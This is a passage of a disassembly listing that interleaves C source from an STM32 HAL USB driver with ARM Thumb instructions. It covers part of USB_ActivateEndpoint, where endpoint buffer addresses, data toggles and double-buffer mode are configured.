 80060f0:	e2d5      	b.n	800669e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80060f2:	687a      	ldr	r2, [r7, #4]
 80060f4:	683b      	ldr	r3, [r7, #0]
 80060f6:	781b      	ldrb	r3, [r3, #0]
 80060f8:	009b      	lsls	r3, r3, #2
 80060fa:	4413      	add	r3, r2
 80060fc:	881b      	ldrh	r3, [r3, #0]
 80060fe:	b29b      	uxth	r3, r3
 8006100:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006104:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006108:	81fb      	strh	r3, [r7, #14]
 800610a:	687a      	ldr	r2, [r7, #4]
 800610c:	683b      	ldr	r3, [r7, #0]
 800610e:	781b      	ldrb	r3, [r3, #0]
 8006110:	009b      	lsls	r3, r3, #2
 8006112:	441a      	add	r2, r3
 8006114:	89fb      	ldrh	r3, [r7, #14]
 8006116:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800611a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800611e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006122:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006126:	b29b      	uxth	r3, r3
 8006128:	8013      	strh	r3, [r2, #0]
 800612a:	e2b8      	b.n	800669e <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 800612c:	687b      	ldr	r3, [r7, #4]
 800612e:	633b      	str	r3, [r7, #48]	; 0x30
 8006130:	687b      	ldr	r3, [r7, #4]
 8006132:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006136:	b29b      	uxth	r3, r3
 8006138:	461a      	mov	r2, r3
 800613a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 800613c:	4413      	add	r3, r2
 800613e:	633b      	str	r3, [r7, #48]	; 0x30
 8006140:	683b      	ldr	r3, [r7, #0]
 8006142:	781b      	ldrb	r3, [r3, #0]
 8006144:	00da      	lsls	r2, r3, #3
 8006146:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006148:	4413      	add	r3, r2
 800614a:	f203 4304 	addw	r3, r3, #1028	; 0x404
 800614e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006150:	683b      	ldr	r3, [r7, #0]
 8006152:	88db      	ldrh	r3, [r3, #6]
 8006154:	085b      	lsrs	r3, r3, #1
 8006156:	b29b      	uxth	r3, r3
 8006158:	005b      	lsls	r3, r3, #1
 800615a:	b29a      	uxth	r2, r3
 800615c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 800615e:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 8006160:	687b      	ldr	r3, [r7, #4]
 8006162:	62bb      	str	r3, [r7, #40]	; 0x28
 8006164:	687b      	ldr	r3, [r7, #4]
 8006166:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800616a:	b29b      	uxth	r3, r3
 800616c:	461a      	mov	r2, r3
 800616e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006170:	4413      	add	r3, r2
 8006172:	62bb      	str	r3, [r7, #40]	; 0x28
 8006174:	683b      	ldr	r3, [r7, #0]
 8006176:	781b      	ldrb	r3, [r3, #0]
 8006178:	00da      	lsls	r2, r3, #3
 800617a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800617c:	4413      	add	r3, r2
 800617e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006182:	627b      	str	r3, [r7, #36]	; 0x24
 8006184:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006186:	881b      	ldrh	r3, [r3, #0]
 8006188:	b29b      	uxth	r3, r3
 800618a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800618e:	b29a      	uxth	r2, r3
 8006190:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006192:	801a      	strh	r2, [r3, #0]
 8006194:	683b      	ldr	r3, [r7, #0]
 8006196:	691b      	ldr	r3, [r3, #16]
 8006198:	2b3e      	cmp	r3, #62	; 0x3e
 800619a:	d91d      	bls.n	80061d8 <USB_ActivateEndpoint+0x2b0>
 800619c:	683b      	ldr	r3, [r7, #0]
 800619e:	691b      	ldr	r3, [r3, #16]
 80061a0:	095b      	lsrs	r3, r3, #5
 80061a2:	66bb      	str	r3, [r7, #104]	; 0x68
 80061a4:	683b      	ldr	r3, [r7, #0]
 80061a6:	691b      	ldr	r3, [r3, #16]
 80061a8:	f003 031f 	and.w	r3, r3, #31
 80061ac:	2b00      	cmp	r3, #0
 80061ae:	d102      	bne.n	80061b6 <USB_ActivateEndpoint+0x28e>
 80061b0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061b2:	3b01      	subs	r3, #1
 80061b4:	66bb      	str	r3, [r7, #104]	; 0x68
 80061b6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061b8:	881b      	ldrh	r3, [r3, #0]
 80061ba:	b29a      	uxth	r2, r3
 80061bc:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061be:	b29b      	uxth	r3, r3
 80061c0:	029b      	lsls	r3, r3, #10
 80061c2:	b29b      	uxth	r3, r3
 80061c4:	4313      	orrs	r3, r2
 80061c6:	b29b      	uxth	r3, r3
 80061c8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80061cc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80061d0:	b29a      	uxth	r2, r3
 80061d2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061d4:	801a      	strh	r2, [r3, #0]
 80061d6:	e026      	b.n	8006226 <USB_ActivateEndpoint+0x2fe>
 80061d8:	683b      	ldr	r3, [r7, #0]
 80061da:	691b      	ldr	r3, [r3, #16]
 80061dc:	2b00      	cmp	r3, #0
 80061de:	d10a      	bne.n	80061f6 <USB_ActivateEndpoint+0x2ce>
 80061e0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061e2:	881b      	ldrh	r3, [r3, #0]
 80061e4:	b29b      	uxth	r3, r3
 80061e6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80061ea:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80061ee:	b29a      	uxth	r2, r3
 80061f0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061f2:	801a      	strh	r2, [r3, #0]
 80061f4:	e017      	b.n	8006226 <USB_ActivateEndpoint+0x2fe>
 80061f6:	683b      	ldr	r3, [r7, #0]
 80061f8:	691b      	ldr	r3, [r3, #16]
 80061fa:	085b      	lsrs	r3, r3, #1
 80061fc:	66bb      	str	r3, [r7, #104]	; 0x68
 80061fe:	683b      	ldr	r3, [r7, #0]
 8006200:	691b      	ldr	r3, [r3, #16]
 8006202:	f003 0301 	and.w	r3, r3, #1
 8006206:	2b00      	cmp	r3, #0
 8006208:	d002      	beq.n	8006210 <USB_ActivateEndpoint+0x2e8>
 800620a:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800620c:	3301      	adds	r3, #1
 800620e:	66bb      	str	r3, [r7, #104]	; 0x68
 8006210:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006212:	881b      	ldrh	r3, [r3, #0]
 8006214:	b29a      	uxth	r2, r3
 8006216:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006218:	b29b      	uxth	r3, r3
 800621a:	029b      	lsls	r3, r3, #10
 800621c:	b29b      	uxth	r3, r3
 800621e:	4313      	orrs	r3, r2
 8006220:	b29a      	uxth	r2, r3
 8006222:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006224:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006226:	687a      	ldr	r2, [r7, #4]
 8006228:	683b      	ldr	r3, [r7, #0]
 800622a:	781b      	ldrb	r3, [r3, #0]
 800622c:	009b      	lsls	r3, r3, #2
 800622e:	4413      	add	r3, r2
 8006230:	881b      	ldrh	r3, [r3, #0]
 8006232:	847b      	strh	r3, [r7, #34]	; 0x22
 8006234:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006236:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800623a:	2b00      	cmp	r3, #0
 800623c:	d01b      	beq.n	8006276 <USB_ActivateEndpoint+0x34e>
 800623e:	687a      	ldr	r2, [r7, #4]
 8006240:	683b      	ldr	r3, [r7, #0]
 8006242:	781b      	ldrb	r3, [r3, #0]
 8006244:	009b      	lsls	r3, r3, #2
 8006246:	4413      	add	r3, r2
 8006248:	881b      	ldrh	r3, [r3, #0]
 800624a:	b29b      	uxth	r3, r3
 800624c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006250:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006254:	843b      	strh	r3, [r7, #32]
 8006256:	687a      	ldr	r2, [r7, #4]
 8006258:	683b      	ldr	r3, [r7, #0]
 800625a:	781b      	ldrb	r3, [r3, #0]
 800625c:	009b      	lsls	r3, r3, #2
 800625e:	441a      	add	r2, r3
 8006260:	8c3b      	ldrh	r3, [r7, #32]
 8006262:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006266:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800626a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800626e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006272:	b29b      	uxth	r3, r3
 8006274:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 8006276:	683b      	ldr	r3, [r7, #0]
 8006278:	781b      	ldrb	r3, [r3, #0]
 800627a:	2b00      	cmp	r3, #0
 800627c:	d124      	bne.n	80062c8 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800627e:	687a      	ldr	r2, [r7, #4]
 8006280:	683b      	ldr	r3, [r7, #0]
 8006282:	781b      	ldrb	r3, [r3, #0]
 8006284:	009b      	lsls	r3, r3, #2
 8006286:	4413      	add	r3, r2
 8006288:	881b      	ldrh	r3, [r3, #0]
 800628a:	b29b      	uxth	r3, r3
 800628c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006290:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006294:	83bb      	strh	r3, [r7, #28]
 8006296:	8bbb      	ldrh	r3, [r7, #28]
 8006298:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800629c:	83bb      	strh	r3, [r7, #28]
 800629e:	8bbb      	ldrh	r3, [r7, #28]
 80062a0:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80062a4:	83bb      	strh	r3, [r7, #28]
 80062a6:	687a      	ldr	r2, [r7, #4]
 80062a8:	683b      	ldr	r3, [r7, #0]
 80062aa:	781b      	ldrb	r3, [r3, #0]
 80062ac:	009b      	lsls	r3, r3, #2
 80062ae:	441a      	add	r2, r3
 80062b0:	8bbb      	ldrh	r3, [r7, #28]
 80062b2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062b6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062ba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80062be:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062c2:	b29b      	uxth	r3, r3
 80062c4:	8013      	strh	r3, [r2, #0]
 80062c6:	e1ea      	b.n	800669e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 80062c8:	687a      	ldr	r2, [r7, #4]
 80062ca:	683b      	ldr	r3, [r7, #0]
 80062cc:	781b      	ldrb	r3, [r3, #0]
 80062ce:	009b      	lsls	r3, r3, #2
 80062d0:	4413      	add	r3, r2
 80062d2:	881b      	ldrh	r3, [r3, #0]
 80062d4:	b29b      	uxth	r3, r3
 80062d6:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80062da:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062de:	83fb      	strh	r3, [r7, #30]
 80062e0:	8bfb      	ldrh	r3, [r7, #30]
 80062e2:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80062e6:	83fb      	strh	r3, [r7, #30]
 80062e8:	687a      	ldr	r2, [r7, #4]
 80062ea:	683b      	ldr	r3, [r7, #0]
 80062ec:	781b      	ldrb	r3, [r3, #0]
 80062ee:	009b      	lsls	r3, r3, #2
 80062f0:	441a      	add	r2, r3
 80062f2:	8bfb      	ldrh	r3, [r7, #30]
 80062f4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062f8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062fc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006300:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006304:	b29b      	uxth	r3, r3
 8006306:	8013      	strh	r3, [r2, #0]
 8006308:	e1c9      	b.n	800669e <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 800630a:	683b      	ldr	r3, [r7, #0]
 800630c:	78db      	ldrb	r3, [r3, #3]
 800630e:	2b02      	cmp	r3, #2
 8006310:	d11e      	bne.n	8006350 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006312:	687a      	ldr	r2, [r7, #4]
 8006314:	683b      	ldr	r3, [r7, #0]
 8006316:	781b      	ldrb	r3, [r3, #0]
 8006318:	009b      	lsls	r3, r3, #2
 800631a:	4413      	add	r3, r2
 800631c:	881b      	ldrh	r3, [r3, #0]
 800631e:	b29b      	uxth	r3, r3
 8006320:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006324:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006328:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 800632c:	687a      	ldr	r2, [r7, #4]
 800632e:	683b      	ldr	r3, [r7, #0]
 8006330:	781b      	ldrb	r3, [r3, #0]
 8006332:	009b      	lsls	r3, r3, #2
 8006334:	441a      	add	r2, r3
 8006336:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 800633a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800633e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006342:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006346:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800634a:	b29b      	uxth	r3, r3
 800634c:	8013      	strh	r3, [r2, #0]
 800634e:	e01d      	b.n	800638c <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 8006350:	687a      	ldr	r2, [r7, #4]
 8006352:	683b      	ldr	r3, [r7, #0]
 8006354:	781b      	ldrb	r3, [r3, #0]
 8006356:	009b      	lsls	r3, r3, #2
 8006358:	4413      	add	r3, r2
 800635a:	881b      	ldrh	r3, [r3, #0]
 800635c:	b29b      	uxth	r3, r3
 800635e:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8006362:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006366:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 800636a:	687a      	ldr	r2, [r7, #4]
 800636c:	683b      	ldr	r3, [r7, #0]
 800636e:	781b      	ldrb	r3, [r3, #0]
 8006370:	009b      	lsls	r3, r3, #2
 8006372:	441a      	add	r2, r3
 8006374:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 8006378:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800637c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006380:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006384:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006388:	b29b      	uxth	r3, r3
 800638a:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 800638c:	687b      	ldr	r3, [r7, #4]
 800638e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006390:	687b      	ldr	r3, [r7, #4]
 8006392:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006396:	b29b      	uxth	r3, r3
 8006398:	461a      	mov	r2, r3
 800639a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800639c:	4413      	add	r3, r2
 800639e:	65fb      	str	r3, [r7, #92]	; 0x5c
 80063a0:	683b      	ldr	r3, [r7, #0]
 80063a2:	781b      	ldrb	r3, [r3, #0]
 80063a4:	00da      	lsls	r2, r3, #3
 80063a6:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80063a8:	4413      	add	r3, r2
 80063aa:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80063ae:	65bb      	str	r3, [r7, #88]	; 0x58
 80063b0:	683b      	ldr	r3, [r7, #0]
 80063b2:	891b      	ldrh	r3, [r3, #8]
 80063b4:	085b      	lsrs	r3, r3, #1
 80063b6:	b29b      	uxth	r3, r3
 80063b8:	005b      	lsls	r3, r3, #1
 80063ba:	b29a      	uxth	r2, r3
 80063bc:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80063be:	801a      	strh	r2, [r3, #0]
 80063c0:	687b      	ldr	r3, [r7, #4]
 80063c2:	657b      	str	r3, [r7, #84]	; 0x54
 80063c4:	687b      	ldr	r3, [r7, #4]
 80063c6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80063ca:	b29b      	uxth	r3, r3
 80063cc:	461a      	mov	r2, r3
 80063ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80063d0:	4413      	add	r3, r2
 80063d2:	657b      	str	r3, [r7, #84]	; 0x54
 80063d4:	683b      	ldr	r3, [r7, #0]
 80063d6:	781b      	ldrb	r3, [r3, #0]
 80063d8:	00da      	lsls	r2, r3, #3
 80063da:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80063dc:	4413      	add	r3, r2
 80063de:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80063e2:	653b      	str	r3, [r7, #80]	; 0x50
 80063e4:	683b      	ldr	r3, [r7, #0]
 80063e6:	895b      	ldrh	r3, [r3, #10]
 80063e8:	085b      	lsrs	r3, r3, #1
 80063ea:	b29b      	uxth	r3, r3
 80063ec:	005b      	lsls	r3, r3, #1
 80063ee:	b29a      	uxth	r2, r3
 80063f0:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80063f2:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 80063f4:	683b      	ldr	r3, [r7, #0]
 80063f6:	785b      	ldrb	r3, [r3, #1]
 80063f8:	2b00      	cmp	r3, #0
 80063fa:	f040 8093 	bne.w	8006524 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80063fe:	687a      	ldr	r2, [r7, #4]
 8006400:	683b      	ldr	r3, [r7, #0]
 8006402:	781b      	ldrb	r3, [r3, #0]
 8006404:	009b      	lsls	r3, r3, #2
 8006406:	4413      	add	r3, r2
 8006408:	881b      	ldrh	r3, [r3, #0]
 800640a:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 800640e:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8006412:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006416:	2b00      	cmp	r3, #0
 8006418:	d01b      	beq.n	8006452 <USB_ActivateEndpoint+0x52a>
 800641a:	687a      	ldr	r2, [r7, #4]
 800641c:	683b      	ldr	r3, [r7, #0]
 800641e:	781b      	ldrb	r3, [r3, #0]
 8006420:	009b      	lsls	r3, r3, #2
 8006422:	4413      	add	r3, r2
 8006424:	881b      	ldrh	r3, [r3, #0]
 8006426:	b29b      	uxth	r3, r3
 8006428:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800642c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006430:	87fb      	strh	r3, [r7, #62]	; 0x3e
 8006432:	687a      	ldr	r2, [r7, #4]
 8006434:	683b      	ldr	r3, [r7, #0]
 8006436:	781b      	ldrb	r3, [r3, #0]
 8006438:	009b      	lsls	r3, r3, #2
 800643a:	441a      	add	r2, r3
 800643c:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 800643e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006442:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006446:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800644a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800644e:	b29b      	uxth	r3, r3
 8006450:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006452:	687a      	ldr	r2, [r7, #4]
 8006454:	683b      	ldr	r3, [r7, #0]
 8006456:	781b      	ldrb	r3, [r3, #0]
 8006458:	009b      	lsls	r3, r3, #2
 800645a:	4413      	add	r3, r2
 800645c:	881b      	ldrh	r3, [r3, #0]
 800645e:	87bb      	strh	r3, [r7, #60]	; 0x3c
 8006460:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 8006462:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006466:	2b00      	cmp	r3, #0
 8006468:	d01b      	beq.n	80064a2 <USB_ActivateEndpoint+0x57a>
 800646a:	687a      	ldr	r2, [r7, #4]
 800646c:	683b      	ldr	r3, [r7, #0]
 800646e:	781b      	ldrb	r3, [r3, #0]
 8006470:	009b      	lsls	r3, r3, #2
 8006472:	4413      	add	r3, r2
 8006474:	881b      	ldrh	r3, [r3, #0]
 8006476:	b29b      	uxth	r3, r3
 8006478:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800647c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006480:	877b      	strh	r3, [r7, #58]	; 0x3a
 8006482:	687a      	ldr	r2, [r7, #4]
 8006484:	683b      	ldr	r3, [r7, #0]
 8006486:	781b      	ldrb	r3, [r3, #0]
 8006488:	009b      	lsls	r3, r3, #2
 800648a:	441a      	add	r2, r3
 800648c:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 800648e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006492:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006496:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800649a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800649e:	b29b      	uxth	r3, r3
 80064a0:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80064a2:	687a      	ldr	r2, [r7, #4]
 80064a4:	683b      	ldr	r3, [r7, #0]
 80064a6:	781b      	ldrb	r3, [r3, #0]
 80064a8:	009b      	lsls	r3, r3, #2
 80064aa:	4413      	add	r3, r2
 80064ac:	881b      	ldrh	r3, [r3, #0]
 80064ae:	b29b      	uxth	r3, r3
 80064b0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80064b4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064b8:	873b      	strh	r3, [r7, #56]	; 0x38
 80064ba:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80064bc:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80064c0:	873b      	strh	r3, [r7, #56]	; 0x38
 80064c2:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80064c4:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80064c8:	873b      	strh	r3, [r7, #56]	; 0x38
 80064ca:	687a      	ldr	r2, [r7, #4]
 80064cc:	683b      	ldr	r3, [r7, #0]
 80064ce:	781b      	ldrb	r3, [r3, #0]
 80064d0:	009b      	lsls	r3, r3, #2
 80064d2:	441a      	add	r2, r3
 80064d4:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80064d6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064da:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064de:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064e2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064e6:	b29b      	uxth	r3, r3
 80064e8:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80064ea:	687a      	ldr	r2, [r7, #4]
 80064ec:	683b      	ldr	r3, [r7, #0]
 80064ee:	781b      	ldrb	r3, [r3, #0]
 80064f0:	009b      	lsls	r3, r3, #2
 80064f2:	4413      	add	r3, r2
 80064f4:	881b      	ldrh	r3, [r3, #0]
 80064f6:	b29b      	uxth	r3, r3
 80064f8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80064fc:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006500:	86fb      	strh	r3, [r7, #54]	; 0x36
 8006502:	687a      	ldr	r2, [r7, #4]
 8006504:	683b      	ldr	r3, [r7, #0]
 8006506:	781b      	ldrb	r3, [r3, #0]
 8006508:	009b      	lsls	r3, r3, #2
 800650a:	441a      	add	r2, r3
 800650c:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 800650e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006512:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006516:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800651a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800651e:	b29b      	uxth	r3, r3
 8006520:	8013      	strh	r3, [r2, #0]
 8006522:	e0bc      	b.n	800669e <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006524:	687a      	ldr	r2, [r7, #4]
 8006526:	683b      	ldr	r3, [r7, #0]
 8006528:	781b      	ldrb	r3, [r3, #0]
 800652a:	009b      	lsls	r3, r3, #2
 800652c:	4413      	add	r3, r2
 800652e:	881b      	ldrh	r3, [r3, #0]
 8006530:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8006534:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8006538:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800653c:	2b00      	cmp	r3, #0
 800653e:	d01d      	beq.n	800657c <USB_ActivateEndpoint+0x654>
 8006540:	687a      	ldr	r2, [r7, #4]
 8006542:	683b      	ldr	r3, [r7, #0]
 8006544:	781b      	ldrb	r3, [r3, #0]
 8006546:	009b      	lsls	r3, r3, #2
 8006548:	4413      	add	r3, r2
 800654a:	881b      	ldrh	r3, [r3, #0]
 800654c:	b29b      	uxth	r3, r3
 800654e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006552:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006556:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 800655a:	687a      	ldr	r2, [r7, #4]
 800655c:	683b      	ldr	r3, [r7, #0]
 800655e:	781b      	ldrb	r3, [r3, #0]
 8006560:	009b      	lsls	r3, r3, #2
 8006562:	441a      	add	r2, r3
 8006564:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 8006568:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800656c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006570:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006574:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006578:	b29b      	uxth	r3, r3
 800657a:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800657c:	687a      	ldr	r2, [r7, #4]
 800657e:	683b      	ldr	r3, [r7, #0]
 8006580:	781b      	ldrb	r3, [r3, #0]
 8006582:	009b      	lsls	r3, r3, #2
 8006584:	4413      	add	r3, r2
 8006586:	881b      	ldrh	r3, [r3, #0]
 8006588:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 800658c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8006590:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006594:	2b00      	cmp	r3, #0
 8006596:	d01d      	beq.n	80065d4 <USB_ActivateEndpoint+0x6ac>
 8006598:	687a      	ldr	r2, [r7, #4]
 800659a:	683b      	ldr	r3, [r7, #0]
 800659c:	781b      	ldrb	r3, [r3, #0]
 800659e:	009b      	lsls	r3, r3, #2
 80065a0:	4413      	add	r3, r2
 80065a2:	881b      	ldrh	r3, [r3, #0]
 80065a4:	b29b      	uxth	r3, r3
 80065a6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80065aa:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065ae:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 80065b2:	687a      	ldr	r2, [r7, #4]
 80065b4:	683b      	ldr	r3, [r7, #0]
 80065b6:	781b      	ldrb	r3, [r3, #0]
 80065b8:	009b      	lsls	r3, r3, #2
 80065ba:	441a      	add	r2, r3
